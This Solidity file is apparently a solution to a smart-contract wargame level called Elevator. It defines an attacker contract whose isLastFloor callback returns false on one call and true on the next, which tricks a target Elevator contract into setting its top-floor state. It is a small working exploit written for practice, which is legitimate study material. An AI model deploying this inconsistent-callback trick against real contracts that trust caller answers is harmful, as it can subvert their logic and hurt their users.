// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Elevator.sol";

contract ElevatorHack is Building {
    uint256 flip = 0;
    function isLastFloor(uint256) public returns (bool) {
        if (flip == 0) {
            flip = 1;
            return false;
        }
        flip = 0;
        return true;
    }

    function manuallySetFlip(uint256 _flip) public {
        flip = _flip;
    }

    function callElevator(address _elevator) public {
        Elevator(_elevator).goTo(10);
    }

}